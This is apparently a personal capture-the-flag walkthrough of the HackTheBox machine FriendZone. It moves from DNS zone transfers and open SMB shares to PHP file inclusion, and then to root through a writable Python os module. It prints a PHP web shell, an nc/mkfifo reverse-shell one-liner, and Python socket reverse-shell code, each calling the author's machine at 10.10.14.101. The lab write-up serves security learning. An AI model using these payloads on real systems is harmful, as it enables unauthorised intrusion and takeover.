# FriendZone [HTB](https://app.hackthebox.com/machines/173)
![friendzone-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/friendzone-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 friendzone.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ports-02.png)


Let's run a version detection scan againts the found ports:

```bash
nmap -p 21,22,53,80,139,443,445 -sCV friendzone.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/nmap-res-03.png)

![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/nmap-res-04.png)


We have the following:

+ A vsftpd/3.0.3 server on port 21.
+ An SSH server on port 22.
+ A DNS server on port 53.
+ An Apache/2.4.29 server on ports 80 & 443. 
+ NetBIOS on port 139.
+ An SMB server on port 445.


There are a few interesting services on this target. To start, we have two file sharing services with the FTP and SMB servers. We also have an Apache server running on both HTTP & HTTPS. Based on the SSL certificate we can see that the site's domain is `friendzone.red`, I added an entry for this domain in my `/etc/hosts` file. Finally we also have a DNS server and an SSH server as well. 


Let's start with the DNS server and see if there are any additional domains to this target. From there we can check both SMB and FTP servers for any misconfiguration that can give us access to system resources. After that we can take a look at the Apache server. 


### DNS Port 53


To start, I queried the `ANY` record of both domains using the below commands, though nothing super useful came from it. 

```bash
dig ANY friendzone.htb @friendzone.htb 
dig ANY friendzone.red @friendzone.htb 
```


Next, I tried to perform a DNS zone transfer for both domains with the below commands:

```bash
dig axfr friendzone.htb @friendzone.htb 
dig axfr friendzone.red @friendzone.htb 
```

The `friendzone.htb` domain rejected the zone transfer, but `friendzone.red` accepted the request:

![red-zone-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/zone-reg-05.png)


We have a few intersting sub-domains here, we can see all of them are mapped to the `localhost` of the target. This can give us access to different internal resources based on the virtual routing of the target. I mapped them all to the external IP of the target in my `/etc/hosts` file.


From here I went on to check the SMB and FTP servers. 


### SMB Port 445


First, I tried to list the available shares using a null session which works to list the shares:

```bash
smbclient -N -L friendzone.htb
```

![list-smb-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/list-smb-06.png)


So I tried to login with the null session to the available shares. 


+ general 

Connecting to this share using a null session works, and we can see a file of `creds.txt`:

```bash
smbclient -N \\\\friendzone.htb\\general
```

![general-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/general-07.png)


I copied this file over to my attack machine and opend it:

![creds-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/creds-08.png)


We can't be certain what "thing" the file is referring too, but let's continue to the other shares.


+ Development

We can connect to the share with a null session, but there is noting inside:

![dev-empty-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/dev-empty-09.png)


+ Files 

Trying to connect to this share with a null session fails. Supplying the recently found credentials don't work either:

```bash
smbclient -U 'admin%WORKWORKHhallelujah@#' \\\\friendzone.htb\\Files
```

![files-fail-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/files-fail-10.png)


I ran `enum4linux` and `crackmapexec` as well, though it didnt lead to anything super useful. 


Let's check the FTP server. 


### FTP Port 21

Trying to login with an `anonymous` session fails:

![anon-fail-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/anon-fail-11.png)


Trying to specify the credentials found earlier also fails. 


Let's move on to check the Apache server.


## Apache Ports 80 & 443

### friendzone.htb


If we open the site at `http://friendzone.htb/` we can see the following:

![site-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/site-12.png)


Not much to see or so here besides the new mentioned domain of `friendzoneportal.red`, I added it to `/etc/hosts` as well and ran another zone transfer with the following command: 

```bash
dig axfr @friendzone.htb friendzoneportal.red
```

This resulted in the following:

![zone-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/zone-13.png)


I added these new sub-domains to my `/etc/hosts` file and continued enumerating the site. 


Next, I ran a directory and file scan using the below command: 


```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://friendzone.htb/FUZZ -e .cgi,.txt,.xml,.html,.php,.js
```


which resulted in the following:

![ffuf-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ffuf-14.png)


Let's take a look at each entry:

+ `http://friendzone.htb/wordpress/`

This is an empty directory:

![wp-empty-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/wp-empty-15.png)


+ `http://friendzone.htb/robots.txt`

This is simply a troll:

![robots-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/robots-16.png)


I dont see much else to do with this site, let's move on to the HTTPS site. 



### friendzone.red

If open the site at `https://friendzone.red/` we get the following meme:

![meme-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/meme-17.png)


Not much to do here, So I ran another directory scan with the below command:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://friendzone.red/FUZZ -e .cgi,.txt,.xml,.html,.php,.js
```

Which resulted in the following:

![ffuf-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ffuf-18.png)


Let's check each entry:


+ `https://friendzone.red/admin/`

Another empty directory:

![admin-empty-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/admin-empty-19.png)


+ `https://friendzone.red/js/`

This one is not empty:

![js-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/js-20.png)


The inner directory reads as such:

![js-inner-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/js-inner-21.png)


I [identified](https://hashes.com/en/tools/hash_identifier) the string as a base64 string, but decoding it doesn't lead to anything. Could just be a rabbit-hole.


At this point I decided to check the sub-domains we found via the zone transfers we did. 


### Sub-Domains


I tried to open each and every sub-domain we found earlier. I started with the `friendzoneportal.red` domain:

+ `https://files.friendzoneportal.red`
+ `https://imports.friendzoneportal.red`
+ `https://vpn.friendzoneportal.red`

All return a 404 status code.


+ `https://admin.friendzoneportal.red`

Does open, and returns the following:

![admin-panel-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/admin-panel-22.png)


Trying to use the credentials we found earlier seems to work, and bring the following page:

![another-one-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/another-one-23.png)


We know that we found another administration related sub-domain of `administrator1.friendzone.red` in the other zone tranfer we did, Let's try this one out:


+ `https://administrator1.friendzone.red`


![admin-panel-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/admin-panel-24.png)


If we use the credentials we found earlier of `admin : WORKWORKHhallelujah@#` we can get past the login form:

![past-login-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/past-login-25.png)


If we open the mentioned `/dashboard.php` file we see the following:

![dashboard-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/dashboard-26.png)


The message talks about inclusion of image files, asking to supply the filename of the image to include via the `image_name` parameter. 


If we try to add the mentioned `image_name` parameter in a request like this:


`https://administrator1.friendzone.red/dashboard.php?image_name=a.jpg&image_id=a.jpg&pagename=timestamp` 


we get the following: 

![ha-ha-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ha-ha-27.png)


I tired to play with the parameters, I found that removing the `image_name` parameter doesn't break the application! We can remove it completely and still get the image. Doens't it go againt's what the message just said? Could this be a troll? 


Removing the `image_id` parameter does breaks the application and we get the initial message. 


But if we remove the `pagename` parameter, or replace the input with something else we still get the image, just without the last line of text. 


I wans't sure exaclty how to exploit this at this time, so I decided to take a look at the rest of the sub-domains we found earlier. I found that the `https://uploads.friendzone.red/` sub-domain is the only one that does open:

![uploads-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/uploads-28.png)


So we have two applications, one is for image uploads, and the other is for image inclusion, how to exploit this? 


I started by trying out the intended use case, I selected a local `jpg` image I have and uploaded it to the application. I then tried to access this image from the image include application but it didn't work. 


I thought perhaps there is a dedicated directory for the uploaded images, so I started a directory and file scan with:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://uploads.friendzone.red/FUZZ -e .cgi,.txt,.xml,.html,.php
```

![ffuf-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ffuf-31.png)


I immediately went for `https://uploads.friendzone.red/files/`, but it was empty. 


We also had an `upload.php` file here as well:

![what-31.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/what-31.5.png)


Okay, I wasnt sure what to do with this, so I ran another directory scan, this time for the `administrator1.friendzone.red/` domain:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://administrator1.friendzone.red/FUZZ -e .cgi,.txt,.xml,.html,.php
```

![ffuf-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ffuf-32.png)


I went for the `image` direcotry, which does have two images:

![images-dir-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/images-dir-33.png)


None of which is our uploaded `cat.jpg`. I tried to access this `b.jpg` image with the following request `https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=timestamp`:

![b-img-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/b-img-34.png)


Not our image. 


But then I noticed the `timestamp.php` file, it fits the `pagename` parameter, could this parameter be sourcing php scripts? What if we changed it to `login` instead with a request like this:


`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=login`


![wrong-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/wrong-35.png)


So there is definitely some form of php script inclusion going on here, maybe something like this: `include($_GET["pagename"] . ".php")` ? 

 
We can try to get the source code for the `/dashboard.php` script using some php filters with a request like this: 


`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard` 


![base64-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/base64-36.png)


Here is the decoder `dashboard.php` script:

```php
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```


We can see that there is a form of authintication going here using the `FrindZoneAuth` cookie. We get this cookie after we succesfully login using the credentials we got from the SMB. 


Next, the script checks for the presence of the `image_id` parameter, and if it's not set, it will display the initial message that comaplains about the `image_name` parameter being missing. And the `image_name` paramter is not acutally used in this script at all, so this is just a troll/rabbit-hole from the creator of the box. If the `image_id` parameter is set, the script will source the supplied image from the `/image` directory. 


But near the end we see the php script inclusion with `include($_GET["pagename"].".php");` as you can see, it's not hardcoded to use any specific directory, so we can try to supply filenames from anywhere in the system. 


The question is, how do we upload a malicious php script to the target? 


The answer I thought of initially was the upload appication at `uploads.friendzone.red`, but I wasn't able to find the `cat.jpg` image I uploaded previously, so I decided to get the source code for this application as well:


`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../uploads/upload`


Here is the decoded `upload.php` script:

```php
<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>
```


It's just a fake upload site. Another troll. 


We need to find another a way to upload files to the target, the only thing that I can think of is the SMB access we had. 


Here is the smb shares listing for reference:

![list-smb-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/list-smb-06.png)


We can see from the comment that the `Files` share is located at `/etc/Files`, so we can probably make a guess that the rest of the shares are also inside the `/etc` directory. 


We know that we had access to the `Development` share though there was nothing there, but can we write into the share?


Let's create a simple web-shell:

```php
<?php system($_REQUEST['cmd']); ?>
```


And try to uplaod this to the share with this a one-liner:

```bash
smbclient -N \\\\friendzone.htb\\Development -c 'put cmd.php test.php'
```

![write-test-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/write-test-37.png)


Yes we can write to the share! 


Now we should be able to access this script with a request like this:

`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test&cmd=id`

![id-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/id-38.png)


It worked!


From here I can start a local listener with:

```bash
rlwrap nc -lnvp 9009
```


And use the following payload to get a shell:

`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.101 9009 >/tmp/f`. 


I just use Burp's Encoder to URL-encode the payload and send it via the following request: 

`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test&cmd=<payload>


Which gives me a shell:

![shell-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/shell-39.png)


## Privilege Escalation


After I land on a shell, I spwan a TTY shell with:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```


Next, I start hunting for quick wins. I try to list any sudo permissions but I get prompted for credentials. Then, I look for any SUID binaries with:


```bash
find / -perm -4000 2>/dev/null
```

![suid-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/suid-40.png)


This bianry looks unusual. I search online and I do find a privesc vulenrability for this binary, but only for versions below `4.86.2`. The target's version is `4.90.1`. 


So I shift gears and start looking around the filesystem. I start with the `/home` directory:

![home-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/home-41.png)


We have read access, inside we can find and read `user.txt`, but there is nothing that can help us elevate privileges. 


Then I decided to look for any custom software inside the `/opt` directory:

![opt-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/opt-42.png)


We can see a `server_admin` directory which contains a `reporter.py` script which is owned by root, and readable by everyone. It reads as such:

![reporter-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/reporter-43.png)


At the moment the script does nothing because it's mostly commented out. But in essence, it defines a command to execute via the `system()` method of the `os` module in pyhton.


Unfortunately, we can't edit the file, or replace it with our own version. 


I decided to leave this script alone for now and take a look at the `/var` directory, specifically I found the following file inside `/var/www`:

![pass-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/pass-44.png)


This password works for the ssh:


![ssh-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ssh-45.png)


## Friend


At first I checked for any `sudo` permissions but there is none for the `friend` user. 


Then I listed open ports on the system using `netstat -lnt`, to see if there are any services running on the localhost. There are a couple but they are not super meaningful, mostly related to dns. 


So I decided to get back to this `reporter.py` script. Specifically, I wanted to see how it's being executed. For this I used using [pspy64](https://github.com/DominicBreuker/pspy).


I host the script using a python server with:

```bash
python3 -m https.server 80
```

And I download the file from the target using:

```bash
wget http://10.10.14.101/pspy64 && chmod +x pspy64
```

Here is the task:

![task-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/task-46.png)


We know that we don't have write access to the `/opt/server_admin` directory. But if we check the permissions to the python `os` module we will find that it's writable:

```bash
cd /usr/lib/python2.7/
find -type f -writable -ls
```

![writable-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/writable-47.png)


This is a Python [libarary hijacking vulnerability](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/). 


If we had write permissions to the `/opt/serve_admin` direcotry we could have craeted a `os.py` of our own, which would have been loaded before the legitimate one, but we don't have write access. 


What we can do instead, is edit the actual `os.py` module, and at the end, add a reverse shell back to our machine.


I use `vi` to open the module at `/usr/lib/python2.7/os.py` and add the following at the end:

```python
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.101",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```


![edit-os-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/edit-os-48.png)


Then I save the file and close it, start my local listner with:

```bash
rlwrap nc -lnvp 443
```

And wait for the connection, which came after a couple of minutes:

![root-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/root-49.png)
